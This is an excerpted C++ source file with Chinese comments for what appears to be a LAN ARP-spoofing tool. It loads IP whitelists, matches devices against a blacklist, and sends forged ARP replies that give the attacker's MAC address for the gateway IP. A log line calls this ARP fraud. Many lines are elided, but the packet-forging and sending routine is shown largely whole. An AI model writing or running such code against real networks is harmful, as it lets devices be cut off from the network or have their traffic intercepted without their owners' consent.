...
// 将6字节MAC地址转换为字符串格式（例如：00:1A:2B:3C:4D:5E）
std::string mac_to_string(const uint8_t mac[6]) 
{
	char buffer[18]; // 6组两位十六进制 + 5个冒号 + 空终止符
...
struct TargetInfo {
  ...
  bool operator==(const TargetInfo& other) const {
		return ip == other.ip && 
				 std::equal(mac, mac+6, other.mac); // 更安全的比较方式
	}
};
...
// 加载白名单文件
std::vector<std::string> load_whitelist(const std::string& file) 
{
  ...
  while (std::getline(f, line)) {
    ...
    if (is_valid_ip(line)) list.push_back(line);
  }
  return list;
}
...
// 过滤白名单设备
std::vector<TargetInfo> filter_targets(const std::vector<TargetInfo>& targets, const std::vector<std::string>& whitelist) 
{
  std::vector<TargetInfo> filtered;
  for (const auto& t : targets) {
    if (std::find(whitelist.begin(), whitelist.end(), t.ip) == whitelist.end()) {
...
void send_spoof_packet(pcap_t* handle, const TargetInfo& target, const uint8_t* attacker_mac, const std::string& gateway_ip) 
{
  ...
  std::cout << "[" << std::put_time(&now_tm, "%Y-%m-%d %H:%M:%S") << "] APR欺诈,目标IP: " << target.ip 
            << ",伪造网关IP: " << gateway_ip << std::endl;

  ether_header eth;
  memcpy(eth.ether_dhost, target.mac, 6);
  memcpy(eth.ether_shost, attacker_mac, 6);
  eth.ether_type = htons(ETH_P_ARP);

  arp_header arp = create_arp_reply(attacker_mac, gateway_ip, target.mac, target.ip);

  u_char packet[sizeof(eth) + sizeof(arp)];
  memcpy(packet, &eth, sizeof(eth));
  memcpy(packet + sizeof(eth), &arp, sizeof(arp));
    ...
    if (pcap_handle) {
      ...
      for (const auto& t : new_targets) {
        ...
        if (!current_status) { // 关闭状态，广播发送
          ...
          std::string target_mac_str = mac_to_string(t.mac);
          if (blacklist.count(target_mac_str) || blacklist.count(t.ip)) {
            send_spoof_packet(pcap_handle, t, iface_info.mac_addr, gateway_ip);
          }
        }
      }
    ...
    try {
      ...
      if (is_delete) {
        ...
        if (pcap_handle) {
          TargetInfo target;
          target.ip = ip;
          string_to_mac(mac, target.mac);
          send_spoof_packet(pcap_handle, target, iface_info.mac_addr, gateway_ip);
        }
      }
